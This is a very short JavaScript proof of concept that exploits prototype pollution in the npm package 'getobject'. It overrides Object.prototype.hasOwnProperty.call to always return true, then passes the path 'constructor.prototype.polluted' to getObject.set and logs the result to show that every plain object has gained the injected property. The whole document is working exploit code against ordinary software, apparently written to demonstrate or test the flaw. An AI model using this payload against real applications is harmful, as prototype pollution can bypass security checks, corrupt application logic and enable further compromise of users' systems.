Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const getObject = require('getobject');
var obj = {};
getObject.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);